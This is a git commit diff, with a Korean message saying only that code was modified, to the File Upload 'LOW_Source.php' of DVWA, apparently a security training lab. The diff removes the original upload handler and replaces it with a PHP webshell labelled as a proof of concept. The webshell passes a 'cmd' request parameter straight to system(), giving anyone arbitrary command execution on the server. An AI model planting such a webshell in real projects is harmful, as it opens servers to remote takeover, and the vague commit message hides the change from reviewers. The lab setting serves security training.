a51cc7622601ced7898513644fc7c5f2fba64b0d
김준혁 <jh0921abc@gmail.com>
2026-04-23 09:31:00 +0900

    코드 수정하였습니다.

--- File Upload/LOW_Source.php
+++ File Upload/LOW_Source.php
@@ -1,19 +1,16 @@
 <?php
-
-if( isset( $_POST[ 'Upload' ] ) ) {
-    // Where are we going to be writing to?
-    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
-    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
-
-    // Can we move the file to the upload folder?
-    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
-        // No
-        echo '<pre>Your image was not uploaded.</pre>';
+    //
+    // PoC: a simple webshell
+    // Author: Bonghwan Choi
+    //
+    
+    echo 'Enter a Command:<br>';
+    echo '<form action="">';
+    echo '<input type=text name="cmd">';
+    echo '<input type="submit">';
+    echo '</form>';
+    
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd']);
     }
-    else {
-        // Yes!
-        echo "<pre>{$target_path} succesfully uploaded!</pre>";
-    }
-}
-
 ?>
